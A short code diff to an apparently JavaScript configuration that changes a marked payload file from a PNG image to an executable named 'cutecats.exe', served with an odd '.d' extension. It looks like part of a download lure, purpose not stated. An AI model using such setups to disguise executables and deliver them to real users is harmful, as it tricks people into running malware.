@@ -30,9 +30,9 @@ const SEARCHES = [
 ]
 
 /* PAYLOAD_CONFIG_START */
-const PAYLOAD_FILE_SRC = "media/downloads/pepper.png"
-const PAYLOAD_BASENAME = "pepper"
-const PAYLOAD_EXT = "png"
+const PAYLOAD_FILE_SRC = "media/downloads/cutecats.exe.d"
+const PAYLOAD_BASENAME = "cutecats.exe"
+const PAYLOAD_EXT = "d"
 /* PAYLOAD_CONFIG_END */
 
 const TOX_ID = PAYLOAD_BASENAME
